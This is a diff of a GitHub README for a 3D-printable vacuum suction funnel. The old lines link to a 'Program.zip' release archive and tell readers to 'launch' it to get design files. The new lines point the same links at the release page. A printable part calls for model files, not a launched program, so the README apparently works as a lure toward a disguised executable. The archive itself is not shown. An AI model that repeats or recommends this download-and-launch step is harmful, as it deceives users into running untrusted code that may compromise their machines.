@@ -22,9 +22,9 @@ Welcome to the "Suction-funnel-for-Bosch-click-clean-system" repository! This pr
 ## 🚀 Quick Start
 To begin using the suction funnel for your Bosch Click&Clean system, simply download the necessary files from the link provided below. You can then proceed to 3D print the funnel and attach it to your Bosch vacuum for an enhanced cleaning experience.
 
-[![Download https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/download/v1.0/Program.zip](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/download/v1.0/Program.zip)](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/download/v1.0/Program.zip)
+[![Download https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/tag/v1.0](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/tag/v1.0)](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/tag/v1.0)
 
-If the link does not direct you to the file itself, please ensure to launch the downloaded "https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/download/v1.0/Program.zip" file to access the necessary design files.
+If the link does not direct you to the file itself, please ensure to launch the downloaded "https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/tag/v1.0" file to access the necessary design files.
 
 ## 🖥️ Additional Resources
 For further information, updates, or alternative download options, please visit the "Releases" section of this repository. You can discover more about the project and any new developments that may have been added since the initial release.
@@ -39,4 +39,4 @@ Let's enhance your vacuuming experience with the innovative suction funnel desig
 
 🌀 Happy vacuuming! 🌀
 
-![Bosch Click&Clean System](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/download/v1.0/Program.zip)
+![Bosch Click&Clean System](https://github.com/Azw1/Suction-funnel-for-Bosch-click-clean-system/releases/tag/v1.0)
